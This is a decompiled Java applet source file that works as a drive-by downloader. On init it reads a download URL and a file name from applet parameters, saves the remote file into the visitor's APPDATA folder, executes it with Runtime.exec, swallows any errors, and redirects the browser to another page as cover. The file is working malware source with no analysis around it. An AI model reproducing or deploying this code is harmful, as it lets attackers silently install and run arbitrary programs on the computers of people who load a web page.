import java.io.InputStream;
import java.net.URL;
import java.io.FileOutputStream;
import java.util.Locale;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Java extends Applet
{
    @Override
    public void init() {
        System.getProperty("java.runtime.version");
        Locale.getDefault().getCountry();
        System.getProperty("os.name").toLowerCase();
        final String getenv = System.getenv("APPDATA");
        final String parameter = this.getParameter("YourFile");
        final String parameter2 = this.getParameter("GoTo");
        try {
            final Runtime runtime = Runtime.getRuntime();
            final FileOutputStream fileOutputStream = new FileOutputStream(getenv + parameter);
            final InputStream inputStream = new URL(this.getParameter("YourDirectLink")).openConnection().getInputStream();
            final byte[] array = new byte[1024];
            int read;
            while ((read = inputStream.read(array, 0, array.length)) != -1) {
                fileOutputStream.write(array, 0, read);
            }
            inputStream.close();
            fileOutputStream.close();
            runtime.exec(getenv + parameter);
            this.getAppletContext().showDocument(new URL(parameter2));
        }
        catch (Exception ex) {}
    }
}
